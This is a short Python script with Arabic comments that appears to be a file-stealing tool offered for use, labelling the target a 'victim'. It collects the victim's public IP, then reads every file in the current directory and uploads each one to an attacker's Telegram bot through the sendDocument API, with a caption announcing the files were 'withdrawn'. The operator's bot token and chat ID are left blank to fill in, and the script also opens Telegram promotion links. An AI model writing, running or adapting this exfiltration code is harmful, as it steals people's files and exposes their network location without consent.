#ممنوع تغيير الحقوق
#ممنوع بيع الادات
#غير مسوول عن اي ستخدام خاطا 
try:
 import requests,os,random
 from user_agent import generate_user_agent
 from uuid import uuid4
 import socket
 import webbrowser
 import datetime
 import sys
 import json
except:
 os.system("pip install requsets")
 os.system("pip install names")
 os.system("pip install user_agent")
 os.system("pip install uid")
 os.system("pip install uuid")
 os.system("pip install webbrowser")
 os.system("pip install socket")
 os.system("pip install datetime")
 webbrowser.open('https://t.me/Abdm39')

 os.system("clear")

os.system('clear')
#------------------------------[ Dlag]------------------------------


import os, requests
token2=''#توكن بوتك بدل كلمه token
ID2=''#ايدي حسابك التلي بدل كلمه ID
import requests
web = requests.get("https://api.ipify.org").text

file_ha=[]
for file in os.listdir():
 if os.path.isfile(file):
  file_ha.append(file)
  g=file
  
  massage='The files have been withdrawn successfully✓'

  ipp = '\n@abdm39 | @adoatt1 \n ip ايبي جهاز  الضحيه:'+web
  start_msg = requests.post(f"https://api.telegram.org/bot{token2}/sendMessage?chat_id\n\n@t.me/VANAEM")
  requests.post(f'https://api.telegram.org/bot{token2}/sendDocument?chat_id={ID2}&caption={massage}        {ipp}', files={'document':open(g, 'rb')})
  

massage='The files have been withdrawn successfully✓@adoatt1 @dlagg1'
webbrowser.open('https://t.me/adoat1')